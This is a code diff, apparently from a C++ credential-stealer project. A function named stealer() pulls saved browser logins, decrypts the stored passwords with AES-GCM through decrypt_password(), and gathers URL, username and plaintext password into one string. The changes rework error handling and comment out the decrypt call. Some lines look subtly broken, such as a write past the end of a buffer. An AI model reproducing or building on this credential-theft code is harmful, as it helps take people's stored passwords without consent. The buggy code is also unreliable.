@@ -73,7 +73,7 @@ std::string decrypt_password(std::string encrypted_pass, BYTE *key)
     }*/
 
     if(encrypted_pass.length()<31){
-        return "error";
+        return "too short";
     }
     auto cipher = new AESGCM(key);
     std::string iv_string = encrypted_pass.substr(3,12);
@@ -103,6 +103,7 @@ std::string decrypt_password(std::string encrypted_pass, BYTE *key)
     printf("\n");
     */
     try{
+        //cipher->Decrypt(iv, (size_t)iv_vec.size(), ciphertext, (size_t)ciphertext_vec.size(), tag, (size_t)tag_vec.size());
         char* p = new char[cipher->ptBufferSize];
         memcpy(p,cipher->plaintext,cipher->ptBufferSize);
         p[cipher->ptBufferSize] = 0;
@@ -110,9 +111,10 @@ std::string decrypt_password(std::string encrypted_pass, BYTE *key)
 
         //std::cout<<p<<std::endl;
         return p;
-    }catch(std::bad_alloc)
+    }catch(const char* &e)
     {
-        std::cout<<"malloc error"<<std::endl;
+        std::cout<<e<<std::endl;
+        return"error";
     }
     
     delete cipher;
@@ -251,22 +253,23 @@ std::string stealer()
     
             string_pass=std::string(char_pass);
             //std::cout<<"fk password: "+string_pass+"\n"<<std::endl;
-            string_password = decrypt_password(string_pass, result);
-            std::cout<<string_password<<std::endl;
-            if (string_password!="error"){
+            try{
+                string_password = decrypt_password(string_pass, result);
                 return_string.append(s5);
                 return_string.append(s1+string_url+s4);
                 return_string.append(s2+string_user+s4);
                 return_string.append(s3+string_password+s4);
-                //std::cout<<return_string<<std::endl;
-            }else{
+            }
+            catch(const char* &e)
+            {
+                std::cout<<e<<std::endl;
                 continue;
             }
-           
-            
-            
-            
-        
+            std::cout<<string_password<<std::endl;
+            if (string_password!="error"){
+                
+                //std::cout<<return_string<<std::endl;
+            }
             
         }
         //std::cout<<return_string<<std::endl;
